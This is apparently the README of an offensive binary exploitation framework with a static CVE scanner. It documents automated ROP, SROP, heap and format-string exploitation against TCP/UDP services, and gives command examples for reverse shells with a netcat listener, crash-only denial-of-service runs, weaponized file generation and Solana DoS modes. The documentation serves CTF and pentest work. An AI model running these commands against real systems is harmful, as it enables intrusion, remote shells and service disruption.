# BinSmasher 🔨

**Ultimate Cross-Platform Binary Exploitation Framework**

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />

> Authorized use only: CTF · pentest · security research  
> Unauthorized access to systems you do not own is illegal.

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Architecture](#architecture)
4. [Subcommands](#subcommands)
5. [binary — Full Reference](#binary--full-reference)
   - [Basic Options](#basic-options)
   - [Network Options](#network-options)
   - [Payload Options](#payload-options)
   - [Custom Payload Mode (UDP+Spawn)](#custom-payload-mode-udpspawn)
   - [Fuzzing Options](#fuzzing-options)
   - [Advanced Exploit Options](#advanced-exploit-options)
   - [DOS / Script Generation](#dos--script-generation)
6. [Exploit Techniques — TCP Mode](#exploit-techniques--tcp-mode)
7. [Exploit Techniques — UDP+Spawn Mode](#exploit-techniques--udpspawn-mode)
8. [Custom Payload Mode — Deep Dive](#custom-payload-mode--deep-dive)
   - [How it Works](#how-it-works)
   - [Payload Template Format](#payload-template-format)
   - [Bad Bytes](#bad-bytes)
   - [Strategy Selection Logic](#strategy-selection-logic)
   - [Constraints and Limitations](#constraints-and-limitations)
9. [file — Malicious File Generation](#file--malicious-file-generation)
10. [solana — Agave / Solana SVM Auditing](#solana--agave--solana-svm-auditing)
11. [Usage Examples](#usage-examples)
    - [CTF — Simple Stack Overflow (TCP)](#ctf--simple-stack-overflow-tcp)
    - [CTF — ret2win (no ASLR)](#ctf--ret2win-no-aslr)
    - [CTF — ASLR + NX + PIE (full mitigations)](#ctf--aslr--nx--pie-full-mitigations)
    - [CTF — Canary + ASLR](#ctf--canary--aslr)
    - [CTF — Format String](#ctf--format-string)
    - [CTF — Heap UAF](#ctf--heap-uaf)
    - [CTF — SROP](#ctf--srop)
    - [CTF — ORW / Seccomp Bypass](#ctf--orw--seccomp-bypass)
    - [Pentest — Remote TCP Service](#pentest--remote-tcp-service)
    - [Pentest — SIP/UDP Service (CVE-style)](#pentest--sipudp-service-cve-style)
    - [Pentest — HTTP Service with Payload Template](#pentest--http-service-with-payload-template)
    - [Pentest — Custom Binary Protocol (UDP)](#pentest--custom-binary-protocol-udp)
    - [Pentest — Reverse Shell](#pentest--reverse-shell)
    - [DOS Mode](#dos-mode)
    - [File Exploits](#file-exploits)
12. [Technique Decision Tree](#technique-decision-tree)
13. [Known Limitations](#known-limitations)
14. [Dependencies](#dependencies)

---

## Overview

BinSmasher automates the full exploitation lifecycle for native binaries:

1. **Static analysis** — finds vulnerable functions, protections, gadgets
2. **Offset detection** — cyclic pattern + corefile / GDB / remote crash scan
3. **Strategy selection** — automatically picks the best exploit technique
4. **Exploit delivery** — sends payload, verifies RCE via callback listener
5. **Script generation** — writes standalone crash/exploit scripts

It handles both **TCP services** (interactive recv/send) and **UDP crash-and-die services** (spawn-target mode with process management).

---

## Installation

```bash
# System dependencies
sudo apt-get install -y python3 python3-pip gdb radare2 \
    pwndbg one_gadget binutils file

# Python dependencies
pip install pwntools pwndbg capstone keystone-engine \
    frida-tools ropper boofuzz rich

# Optional: AFL++ for coverage fuzzing
sudo apt-get install -y afl++

# Clone and verify
git clone https://github.com/your-org/binsmasher
cd binsmasher
python3 src/main.py --help
```

---

## Architecture

```
binsmasher/
├── src/
│   ├── main.py           # Entry point, CLI, UDP+spawn exploit engine
│   ├── analyzer.py       # Static analysis, protections, libc query
│   ├── exploiter.py      # TCP exploit techniques (18+ strategies)
│   ├── fuzzer.py         # Offset detection, fuzzing, payload delivery
│   ├── file_exploiter.py # Malicious file generation (25+ formats)
│   └── utils.py          # Config, logging, summary table
```

**main.py** contains the UDP+spawn exploit engine as standalone functions:

| Function | Purpose |
|---|---|
| `_find_system_and_binsh()` | Locate system() and /bin/sh in libc |
| `_find_libc_path()` | Find libc.so.6 on disk |
| `_addr_ok()` | Check address against bad bytes |
| `_spawn_and_read_bases()` | Spawn binary, read PIE+libc bases from /proc |
| `_attempt_rop_system()` | Strategy A: pop rdi + /bin/sh + system() |
| `_attempt_srop()` | Strategy B: sigreturn frame → execve |
| `_attempt_got_overwrite()` | Strategy C: overwrite GOT entry with system() |
| `_attempt_ret2win()` | Strategy D: jump to win/flag/shell function |
| `_attempt_one_gadget()` | Strategy E: libc magic gadget |
| `_attempt_orw()` | Strategy F: open/read/write flag (seccomp) |
| `_run_udp_spawn_exploit()` | Orchestrator: tries A→F in order |

---

## Subcommands

```
python3 src/main.py binary   [options]   # Exploit native ELF/PE binaries
python3 src/main.py file     [options]   # Generate malicious files
python3 src/main.py solana   [options]   # Agave / Solana SVM auditing
```

---

## binary — Full Reference

### Basic Options

| Flag | Default | Description |
|---|---|---|
| `-b`, `--binary` | required | Path to target binary |
| `-c`, `--cmd` | `id` | Command to execute via shellcode |
| `-p`, `--pattern-size` | `200` | Initial cyclic pattern size |
| `-r`, `--return-addr` | auto | Hex return address (skips auto-detection) |
| `--return-offset` | `80` | Byte offset from stack addr to return addr |
| `-t`, `--test-exploit` | off | Fire exploit and verify output via callback |
| `-l`, `--log-file` | `binsmasher.log` | Log file path (DEBUG level written to file) |

### Network Options

| Flag | Default | Description |
|---|---|---|
| `--host` | `localhost` | Target host |
| `--port` | `4444` | Target port |
| `--tls` | off | Use TLS/SSL for the connection |
| `--output-ip` | `127.0.0.1` | Listener IP for shellcode callback / revshell |
| `--output-port` | `6666` | Listener port for shellcode callback / revshell |

### Payload Options

| Flag | Default | Description |
|---|---|---|
| `--reverse-shell` | off | Generate reverse shell payload (connect back to `--output-ip:--output-port`) |
| `--file-input` | — | Embed shellcode inside `mp3` or `raw` file |
| `--binary-args` | `""` | Arguments to pass to the binary when spawning it |
| `--payload-data` | — | Custom payload template. Supports `{PAYLOAD}` placeholder for injection. See [Custom Payload Mode](#custom-payload-mode--deep-dive). |
| `--udp` | off | Send `--payload-data` via UDP (default: TCP) |
| `--spawn-target` | off | Spawn the binary locally for crash detection. Required for UDP+spawn mode. |
| `--bad-bytes` | `""` | Hex bytes to avoid in exploit addresses. Protocol-dependent. E.g. `0a0d` for SIP/SDP (LF/CR terminate lines). `00` for null-free. Empty = no restriction. |

### Custom Payload Mode (UDP+Spawn)

Enabled when **all three** are present: `--payload-data` + `--udp` + `--spawn-target`.

This mode is for **crash-and-die services** that speak custom binary/text protocols over UDP.
BinSmasher:
1. Spawns the binary, injects a cyclic pattern into `{PAYLOAD}` to find the offset
2. Reads PIE base and libc base from `/proc/PID/maps`
3. Extracts the crash RIP from a core dump
4. Scans all stack mappings to find the exact return address offset
5. Tries exploit strategies A through F

### Fuzzing Options

| Flag | Default | Description |
|---|---|---|
| `--fuzz` | off | boofuzz network fuzzer (finds additional crash inputs) |
| `--mutation-fuzz` | off | Built-in mutation fuzzer (bit flips, boundary values, format strings) |
| `--afl-fuzz` | off | AFL++ coverage-guided fuzzing |
| `--afl-timeout` | `60` | AFL++ runtime in seconds |
| `--frida` | off | Frida dynamic instrumentation (traces function calls at runtime) |
| `--protocol` | `raw` | Protocol hint for boofuzz: `raw`, `http`, `sip`, `ftp`, etc. |

### Advanced Exploit Options

| Flag | Default | Description |
|---|---|---|
| `--heap-exploit` | off | Enable heap exploitation path (UAF, fastbin, tcache) |
| `--safeseh-bypass` | off | SafeSEH bypass for Windows SEH exploits |
| `--privilege-escalation` | off | Post-exploitation privesc attempt |
| `--cfi-bypass` | off | CFI bypass via valid-target pivot |
| `--stack-pivot` | off | Build stack pivot chain using `leave; ret` |
| `--largebin-attack` | off | Largebin attack for glibc ≥ 2.28 heap exploitation |
| `--gdb-mode` | `pwndbg` | GDB script flavour: `pwndbg`, `peda`, `vanilla` |
| `--srop` | off | Force Sigreturn-Oriented Programming chain |
| `--orw` | off | Force ORW chain (open/read/write flag — seccomp bypass) |
| `--flag-path` | `/flag` | Flag file path for ORW chain |

### DOS / Script Generation

| Flag | Description |
|---|---|
| `--dos` | Find offset, crash target, generate `crash_<binary>.py` and `exploit_<binary>.py` |
| `--generate-scripts` | Always write standalone scripts (even on success) |

---

## Exploit Techniques — TCP Mode

TCP mode (`create_exploit`) supports full two-stage exploits including leaks.

| # | Technique | Trigger condition | Notes |
|---|---|---|---|
| 0 | **ret2win** | Win/flag/shell symbol in binary | Fastest path, no leak needed |
| 1 | **Libc leak** | ASLR on, offsets known | Calls puts/printf to leak a GOT address |
| 2 | **Canary leak/brute** | `canary_enabled=True` | Format string leak or byte-by-byte brute |
| 3 | **PIE leak** | PIE on | Format string or partial overwrite |
| 4 | **ret2system ROP** | NX on, libc base known | `pop rdi` + `/bin/sh` + `system()` |
| 5 | **ret2csu** | No `pop rdi` gadget | Uses `__libc_csu_init` gadgets for rdi/rsi/rdx control |
| 6 | **SROP** | `--srop` or no other path | Sigreturn frame → `execve("/bin/sh", 0, 0)` |
| 7 | **ORW** | `--orw` or seccomp detected | `open("/flag") + read() + write()` |
| 8 | **Format string** | Printf family detected, Partial RELRO | GOT overwrite via `%n` |
| 9 | **Shellcode** | NX off | NOP sled + shellcode on stack |
| 10 | **ret2libc static** | NX on, no ASLR | ROP chain with known libc addresses |
| 11 | **ret2libc ASLR** | NX on, ASLR on, libc known | ROP chain with leaked libc base |
| 12 | **ret2dlresolve** | No libc leak available | Resolves symbols via `.dynamic` section |
| 13 | **Heap UAF** | `--heap-exploit`, heap functions | Use-After-Free → arbitrary write |
| 14 | **Fastbin dup** | `--heap-exploit`, glibc < 2.29 | Double-free → arbitrary alloc |
| 15 | **one_gadget** | one_gadget installed | Libc magic gadget calling execve directly |
| 16 | **CFI bypass** | `--cfi-bypass` | Valid-target pivot via indirect call site |
| 17 | **SafeSEH bypass** | `--safeseh-bypass`, Windows | SEH overwrite with non-SafeSEH module |
| 18 | **Stack pivot** | `--stack-pivot` | `leave; ret` to redirect RSP to controlled data |
| 19 | **Largebin attack** | `--largebin-attack`, glibc ≥ 2.28 | Corrupts `bk_nextsize` → arbitrary write |

---

## Exploit Techniques — UDP+Spawn Mode

For crash-and-die UDP services where receiving data back is not possible.
Strategies are tried in order A → F and stop on first success.

| Strategy | Name | Viable when |
|---|---|---|
| A | **ret2system ROP** | `ret_addr_offset + 24 < min_crash` AND pop rdi gadget available |
| A* | **ret2csu fallback** | Same as A but uses `__libc_csu_init` when pop rdi not found |
| B | **SROP** | `syscall;ret` + `pop rax;ret` gadgets available AND `ret_addr_offset + 272 < min_crash` |
| C | **GOT overwrite** | Write-what-where primitive detected (ptr overwrite crash type) |
| D | **ret2win** | Win/flag/shell symbol in binary AND `ret_addr_offset + 8 < min_crash` |
| E | **one_gadget** | `one_gadget` installed AND gadget address has no bad bytes AND fits |
| F | **ORW** | `--orw` flag set AND seccomp blocks execve AND chain fits |

**Techniques NOT in UDP+spawn mode (and why):**

| Technique | Reason not implemented |
|---|---|
| ret2plt + libc leak | Requires receiving data back from target. For UDP, the socket fd is unknown and the response channel is not guaranteed. |
| DynELF | Requires arbitrary read primitive with response feedback. Impossible without a receive channel. |
| Format string leak | Requires receiving the formatted output. Only viable over TCP/interactive channels. |
| Stack pivot | Requires a predictable writable address for RSP. With full ASLR+PIE, no such address is available generically. |
| Shellcode | NX is on in virtually all modern binaries. |
| Canary brute | Requires many attempts and observing whether each attempt crashed. Possible in theory but not yet implemented. |

---

## Custom Payload Mode — Deep Dive

### How it Works

Custom payload mode is activated with `--payload-data + --udp + --spawn-target`.

```
Invocation flow:

1. BISECT: find min_crash_sz (first payload size that causes SIGSEGV)
   - Phase 1: probe sizes [8, 16, 32, 64, 128, 192, 256, 320, 384, 512]
   - Bisect: narrow to exact byte boundary

2. COREDUMP: inject cyclic(min_crash_sz), collect core file
   - Extract RIP from core
   - Scan all stack mappings for cyclic pattern
   - Detect 8-byte consecutive run → exact ret addr slot offset

3. PROCESS BASES: read from /proc/PID/maps after spawning fresh binary
   - PIE base: first r-xp mapping of the binary
   - libc base: first r-xp mapping of libc.so

4. EXPLOIT: try strategies A→F
   - For each attempt: spawn fresh binary, wait for port, read new ASLR bases
   - Retry up to 16 times per offset until clean addresses (no bad bytes)
   - Send exploit payload via UDP using the template
   - Detect success via probe file created by system("touch /tmp/probe")
```

### Payload Template Format

The `--payload-data` value is the exact bytes to send to the target.
Use `{PAYLOAD}` as a placeholder where the cyclic pattern (during detection)
or the exploit payload (during exploitation) will be injected.

**Content-Length auto-recalculation:** If the template contains a
`Content-Length:` header, BinSmasher recalculates it after injection.

**Example — SIP INVITE with ICE ufrag injection:**
```
cat invite.txt
```
```
INVITE sip:target@127.0.0.1 SIP/2.0
Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bK-test
From: <sip:attacker@127.0.0.1>;tag=1234
To: <sip:target@127.0.0.1>
Call-ID: attack@127.0.0.1
CSeq: 1 INVITE
Content-Type: application/sdp
Content-Length: {CONTENT_LENGTH}

v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
a=ice-ufrag:{PAYLOAD}
a=ice-pwd:somepassword1234567890123
m=audio 5004 RTP/AVP 0
```

**Example — HTTP POST with body injection:**
```
cat http_payload.txt
```
```
POST /upload HTTP/1.1
Host: 192.168.1.10
Content-Type: application/octet-stream
Content-Length: {CONTENT_LENGTH}

{PAYLOAD}
```

**Example — Binary protocol with fixed header:**
```python
# Create a binary template with {PAYLOAD} at the injection point
import struct

header = struct.pack(">HHI", 0xDEAD, 0x0001, 0)  # magic, type, length
# Write template with literal {PAYLOAD} marker
with open("template.bin", "wb") as f:
    f.write(header + b"{PAYLOAD}")
```
```bash
python3 src/main.py binary -b ./vuln_server \
  --host 192.168.1.10 --port 9000 \
  --udp --spawn-target \
  --payload-data "$(cat template.bin)" \
  --bad-bytes 00
```

**Example — Null-terminated string field:**
```bash
# Protocol appends nothing after our data
python3 src/main.py binary -b ./vuln \
  --host 127.0.0.1 --port 8888 \
  --udp --spawn-target \
  --payload-data "CMD {PAYLOAD}" \
  --bad-bytes 000a0d
```

### Bad Bytes

`--bad-bytes` is a hex string of bytes that must not appear in any exploit
address (system(), /bin/sh, gadgets). The tool retries ASLR until it gets
addresses free of bad bytes (up to 16 attempts per exploit attempt).

**Common values by protocol:**

| Protocol | `--bad-bytes` value | Reason |
|---|---|---|
| Raw TCP/UDP | *(empty)* | No restriction |
| SIP / SDP | `0a0d` | `\n` and `\r` terminate SDP lines |
| HTTP headers | `0a0d` | `\r\n` terminates headers |
| HTTP body | `0d` | `\r` may cause issues |
| Null-terminated C string | `00` | `\0` terminates `strcpy`/`gets` |
| C string + newline | `000a0d` | Combined restriction |
| URL-encoded | `000a0d20` | Also avoid space and null |

**Note:** `0x00` (null) bytes are always present in upper bytes of
x86_64 addresses (`0x00007f...`). BinSmasher handles this automatically —
do not add `00` to bad bytes unless the specific vulnerable field is a
C string (e.g. `gets`, `strcpy`, `scanf`).

### Strategy Selection Logic

```
coredump_rip in cyclic?
  YES → direct stack overflow, exact RIP offset known
  NO  → RIP in libc (0x7f...) → copy function crashed before ret
          → stack IS overwritten, use len < min_crash

Strategies A–F:
  A: ret2system ROP
     ├─ Viable: ret_addr_offset + 24 < min_crash
     ├─ Not viable: print constraint and skip immediately
     └─ pop_rdi not found: try ret2csu from __libc_csu_init
  B: SROP (sigreturn frame)
     └─ Viable: has syscall;ret, pop_rax;ret, and ret_addr_offset + 272 < min_crash
  C: GOT overwrite
     └─ Only tried for ptr_overwrite crash type
  D: ret2win
     └─ Viable: win symbol found AND ret_addr_offset + 8 < min_crash
  E: one_gadget
     └─ Viable: one_gadget installed AND addresses have no bad bytes
  F: ORW (--orw flag only)
     └─ Viable: --orw flag set AND chain fits
```

### Constraints and Limitations

The most common reason for failure in UDP+spawn mode is the **copy crash constraint:**

```
Constraint: ret_addr_offset + chain_len >= min_crash

Example (CVE-2026-25994 ice-ufrag field):
  ret_addr_offset = 176
  min_crash       = 184
  gap             = 8 bytes

  ret2system: 176 + 24 = 200 >= 184 → impossible
  SROP:       176 + 272 = 448 >= 184 → impossible
  ret2win:    176 +  8 = 184 >= 184 → impossible (exactly min_crash)
  one_gadget: 176 +  8 = 184 >= 184 → impossible

Additionally, if the target appends bytes after the payload (e.g. ':'+suffix),
the last bytes of the ret addr slot are forced to non-zero values,
making the address non-canonical on x86_64.

Solution: find another overflow field with a larger gap, or control what
the target appends so that byte 7 of the ret addr = 0x00.
```

---

## file — Malicious File Generation

Generate weaponized files for parser/reader exploits.

```bash
python3 src/main.py file \
  --format mp3 \
  --offset 256 \
  --technique overflow \
  --shellcode-hex 90909090...  \
  -o ./payloads/
```

**Supported formats:**

| Category | Formats |
|---|---|
| Audio | `mp3`, `wav`, `flac`, `ogg`, `aac` |
| Documents | `pdf`, `doc`, `docx`, `xls`, `xlsx`, `rtf`, `txt`, `csv` |
| Data | `json`, `xml`, `html`, `svg` |
| Images | `bmp`, `png`, `gif`, `jpeg` |
| Code | `py`, `js`, `php`, `lua`, `rb` |
| Archives | `zip_bomb`, `tar` |
| Binary | `elf`, `raw` |

**Options:**

| Flag | Description |
|---|---|
| `--format FORMAT` | File format (see table above) |
| `--offset N` | Byte offset to the return address |
| `--technique` | `overflow` (default), `fmtstr`, `inject` |
| `--shellcode-hex HEX` | Raw shellcode bytes as hex string |
| `-o DIR` | Output directory |
| `--all-formats` | Generate all formats at once |

**Generate all formats at once:**
```bash
python3 src/main.py file \
  --all-formats \
  --offset 512 \
  --shellcode-hex $(python3 -c "from pwn import *; context.arch='amd64'; print(asm(shellcraft.sh()).hex())") \
  -o ./payloads/
```

---

## solana — Agave / Solana SVM Auditing

```bash
python3 src/main.py solana \
  --rpc http://localhost:8899 \
  --source-path ./agave/src \
  --exploit-type svm-bpf
```

| `--exploit-type` | Description |
|---|---|
| `svm-bpf` | BPF program verifier bypass / execution |
| `deser` | Account deserialization vulnerability |
| `dos-quic` | QUIC connection denial of service |
| `snapshot-assert` | Snapshot loading assertion panic |

---

## Usage Examples

### CTF — Simple Stack Overflow (TCP)

Target: local binary, stdin-based overflow, no mitigations.

```bash
# Auto-detect everything
python3 src/main.py binary \
  -b ./vuln \
  --host 127.0.0.1 --port 4444 \
  -t
```

### CTF — ret2win (no ASLR)

Binary has a `win()` function, no ASLR, NX on.

```bash
python3 src/main.py binary \
  -b ./pwn1 \
  --host 127.0.0.1 --port 1337 \
  -t
# BinSmasher will detect win() via static analysis and jump directly to it.
```

### CTF — ASLR + NX + PIE (full mitigations)

```bash
# TCP mode: BinSmasher leaks libc via puts@plt, then does ret2system
python3 src/main.py binary \
  -b ./hard_pwn \
  --host 127.0.0.1 --port 9001 \
  --output-ip 10.0.0.1 --output-port 4444 \
  -t --generate-scripts
```

### CTF — Canary + ASLR

```bash
python3 src/main.py binary \
  -b ./canary_binary \
  --host 127.0.0.1 --port 2222 \
  -t
# Canary detected → automatic leak or byte-by-byte brute via fork server
```

### CTF — Force SROP

When `pop rdi` gadget is not available but `syscall;ret` is:

```bash
python3 src/main.py binary \
  -b ./srop_chal \
  --host 127.0.0.1 --port 3333 \
  --srop \
  -t
```

### CTF — Format String

```bash
python3 src/main.py binary \
  -b ./fmtstr_chal \
  --host 127.0.0.1 --port 5555 \
  -t
# Format string functions detected → GOT overwrite via %n if Partial RELRO
```

### CTF — Heap UAF

```bash
python3 src/main.py binary \
  -b ./heap_chal \
  --host 127.0.0.1 --port 7777 \
  --heap-exploit \
  -t
```

### CTF — ORW / Seccomp Bypass

```bash
# When execve is blocked by seccomp, read the flag via open/read/write
python3 src/main.py binary \
  -b ./sandboxed_chal \
  --host 127.0.0.1 --port 8888 \
  --orw --flag-path /home/ctf/flag.txt \
  -t
```

---

### Pentest — Remote TCP Service

```bash
python3 src/main.py binary \
  -b /usr/sbin/vuln_daemon \
  --host 192.168.1.50 --port 4242 \
  --output-ip 192.168.1.1 --output-port 9999 \
  -t --generate-scripts
```

### Pentest — SIP/UDP Service (CVE-style)

For services that speak SIP over UDP and crash-and-die on overflow.

```bash
# 1. Create your SIP INVITE template with {PAYLOAD} in the overflow field
cat > invite.txt << 'EOF'
INVITE sip:target@127.0.0.1 SIP/2.0
Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bKtest
From: <sip:attacker@127.0.0.1>;tag=1234
To: <sip:target@127.0.0.1>
Call-ID: test@127.0.0.1
CSeq: 1 INVITE
Content-Type: application/sdp
Content-Length: {CONTENT_LENGTH}

v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
a=ice-ufrag:{PAYLOAD}
a=ice-pwd:validpassword12345678901234
m=audio 5004 RTP/AVP 0
EOF

# 2. Run BinSmasher
python3 src/main.py binary \
  -b /path/to/sip_server \
  --host 127.0.0.1 --port 5060 \
  --udp --spawn-target \
  --binary-args "--local-port=5060 --log-level=0 --no-tcp --auto-answer=200" \
  --bad-bytes 0a0d \
  --output-ip 127.0.0.1 --output-port 6666 \
  --payload-data "$(cat invite.txt)"
```

**What happens:**
1. BinSmasher spawns the SIP server with `--binary-args`
2. Injects `cyclic(N)` at `{PAYLOAD}` position, recalculates `Content-Length`
3. Bisects to find `min_crash_sz`
4. Collects core dump, scans stack → finds exact return address offset
5. Tries exploit strategies A–F with addresses free of `\r\n` bytes

### Pentest — HTTP Service with Payload Template

```bash
cat > http_template.txt << 'EOF'
POST /process HTTP/1.1
Host: 192.168.1.10
Content-Type: application/x-www-form-urlencoded
Content-Length: {CONTENT_LENGTH}

name={PAYLOAD}&action=submit
EOF

python3 src/main.py binary \
  -b ./http_server \
  --host 192.168.1.10 --port 8080 \
  --udp --spawn-target \
  --bad-bytes 0a0d20 \
  --payload-data "$(cat http_template.txt)"
```

### Pentest — Custom Binary Protocol (UDP)

```bash
# Protocol: 4-byte magic + 2-byte length + payload
python3 - << 'EOF' > binary_template.bin
import sys
header = b'\xDE\xAD\xBE\xEF\x00\x00'  # magic + length (recalculated)
sys.stdout.buffer.write(header + b'{PAYLOAD}')
EOF

python3 src/main.py binary \
  -b ./udp_service \
  --host 10.0.0.5 --port 7777 \
  --udp --spawn-target \
  --bad-bytes 000a \
  --payload-data "$(cat binary_template.bin)"
```

### Pentest — Reverse Shell

```bash
# Set up listener first:
# nc -lvnp 4444

python3 src/main.py binary \
  -b ./remote_service \
  --host 192.168.1.100 --port 9999 \
  --reverse-shell \
  --output-ip 192.168.1.1 --output-port 4444 \
  -t
```

### DOS Mode

Find the crash offset and generate standalone scripts without attempting RCE:

```bash
python3 src/main.py binary \
  -b ./target \
  --host 192.168.1.50 --port 8080 \
  --dos --generate-scripts
# Writes: crash_target.py and exploit_target.py
```

---

## Technique Decision Tree

```
                      ┌─────────────────┐
                      │  Start          │
                      └────────┬────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Win/flag symbol    │
                    │  in binary?         │
                    └──────────┬──────────┘
                       YES ────┼──── NO
                               │           │
                    ┌──────────▼────┐      │
                    │  ret2win      │      │
                    └───────────────┘      │
                                  ┌────────▼────────┐
                                  │  NX enabled?    │
                                  └────────┬────────┘
                               NO ─────────┼───── YES
                               │                    │
                    ┌──────────▼────┐    ┌──────────▼──────────┐
                    │  Shellcode    │    │  ASLR enabled?      │
                    └───────────────┘    └──────────┬──────────┘
                                         NO ────────┼──── YES
                                         │               │
                              ┌──────────▼────┐    ┌─────▼───────────┐
                              │ ret2libc      │    │  Libc leak      │
                              │ static        │    │  available?     │
                              └───────────────┘    └─────┬───────────┘
                                                  YES ───┼─── NO
                                                  │           │
                                       ┌──────────▼──┐  ┌─────▼───────┐
                                       │ ret2system  │  │ ret2dlresolve│
                                       │ / ret2csu   │  │ / SROP      │
                                       └─────────────┘  └─────────────┘
```

---

## Known Limitations

### UDP+Spawn Mode

- **ret2plt + libc leak**: Not implemented. Requires receiving data back from the target over a known socket fd. For UDP services this cannot be generalized — the response channel and socket fd are target-specific.

- **DynELF**: Not implemented. Requires an arbitrary-read primitive with response feedback. Only viable over TCP or with a known network socket.

- **Format string leak**: Not implemented for UDP. Format string output is printed by the target, not returned over the injection socket.

- **Stack pivot**: Not implemented generically. Requires a predictable writable address to redirect RSP. With full ASLR+PIE, no such address is available without a prior leak.

- **Multi-stage exploits**: UDP+spawn mode is single-stage only. Two-stage exploits (leak → return to vuln → exploit) are only supported in TCP mode.

### Copy Crash Constraint

If `ret_addr_offset + min_chain_len >= min_crash`, exploitation is impossible via that specific overflow field. This happens when:
- The target appends extra bytes after the payload (suffix), AND
- The suffix falls inside the return address slot

In this case:
1. Find a different overflow field with a larger gap
2. Control what the target appends (make the suffix start with `\x00`)
3. Use a different exploitation primitive (heap, GOT, ptr overwrite)

### General

- Windows exploits (SafeSEH, CFG) have limited testing — primarily designed for Linux/ELF
- Kernel exploits are not in scope
- Browser/JavaScript engine exploits are not in scope
- ARM/MIPS/RISC-V support is partial (x86_64 is primary)

---

## Dependencies

| Tool | Required | Purpose |
|---|---|---|
| `python3` ≥ 3.10 | Yes | Runtime |
| `pwntools` | Yes | Exploit primitives, ROP, cyclic, ELF |
| `radare2` | Yes | Static analysis, gadget finding |
| `gdb` | Recommended | Offset detection strategy 2 |
| `one_gadget` | Recommended | one_gadget strategy in UDP+spawn mode |
| `AFL++` | Optional | Coverage-guided fuzzing (`--afl-fuzz`) |
| `frida` | Optional | Dynamic instrumentation (`--frida`) |
| `boofuzz` | Optional | Network fuzzing (`--fuzz`) |

---

## CVE Scanner

<img width="1770" height="942" alt="image" src="https://github.com/user-attachments/assets/feacfd20-d743-4e29-96c4-42f9148ab327" />

**Static-only binary vulnerability scanner for responsible disclosure.**

BinSmasher performs automated static analysis on Linux ELF binaries, identifies dangerous function calls, applies data-flow taint analysis to determine exploitability, and generates ready-to-submit MITRE CVE records, interactive HTML reports, and structured JSON exports.

### Features

- **25+ dangerous functions detected** — `gets`, `strcpy`, `system`, `printf`, `recv`, `sprintf`, `memcpy`, `scanf`, `sscanf`, `read`, `fread`, `strcat`, `strncat`, `strncpy`, `realpath`, `getwd`, `mktemp`, `tmpnam`, `popen`, `dlopen`, and more
- **Static taint analysis** — `CONFIRMED` / `PROBABLE` / `UNCONFIRMED` confidence using call-graph BFS + argument-register heuristics
- **Binary protection detection** — NX/DEP, PIE, stack canaries, RELRO, FORTIFY, Shadow Stack, ASLR
- **CVSS-adjusted risk scoring** — Critical / High / Medium / Low severity classification
- **Multiple export formats:**
  - Interactive HTML report (searchable, filterable table + charts)
  - `cve_audit_all_*.json` — all findings
  - `cve_audit_confirmed_high_*.json` — CONFIRMED + High/Critical only
  - `cve_audit_probable_high_*.json` — PROBABLE + High/Critical only
  - MITRE CVE submission templates (Markdown)
- **No extra Python deps** — uses `objdump`, `readelf`, `nm`, `strings`, `checksec` (optional)
- **Single-binary or directory scanning mode**

### Usage

```bash
# Scan default path (/usr/bin)
python3 cve_scan.py

# Scan specific directories
python3 cve_scan.py /usr/sbin /opt/binaries

# Audit a single binary
python3 cve_scan.py --single /tmp/vuln_binary

# Advanced: custom output dir, confidence threshold, no taint
python3 cve_scan.py \
  --single ./target/binary \
  --output-dir ./my_reports \
  --threshold 100 \
  --confidence CONFIRMED \
  --no-taint \
  --verbose
```

### Options

| Argument | Description | Default |
|---|---|---|
| `paths` | Directories or files to scan | `/usr/bin` |
| `-o, --output-dir` | Output directory | `./cve_reports` |
| `--threshold` | Minimum risk score to report | `50` |
| `--confidence` | Minimum confidence (`CONFIRMED`/`PROBABLE`) | `PROBABLE` |
| `--no-taint` | Disable taint analysis | Enabled |
| `--no-html` | Skip HTML report generation | HTML enabled |
| `-v, --verbose` | Enable debug logging | Off |

---

## Contributing

Contributions are welcome. Please open an issue or submit a pull request.

Areas for improvement:
- Support for additional architectures (ARM64, MIPS, RISC-V)
- More sophisticated taint propagation
- AI-powered analysis — BinSmasher Agent
- Docker container for easy deployment

---

## Donations

If BinSmasher has been useful in your research or competitions:

**ETH** — `0xD773B73C7ea4862020b7B5B58f31Ea491f5a9bA3`

**BTC** — `bc1ql6qvsk67hl5vz346kx4gueqjhp6me9ss8eflgt`

**SOL** — `GYBiTvVbPvPJP7ZK5oaqc9w6UtHvd6NkhSPP2UBhDvfh`

---

## Authors

**AncientEncoder**

**A. Canto** — InsecureWorld

**V. Nos** — Cryptocalypse

BinSmasher Team
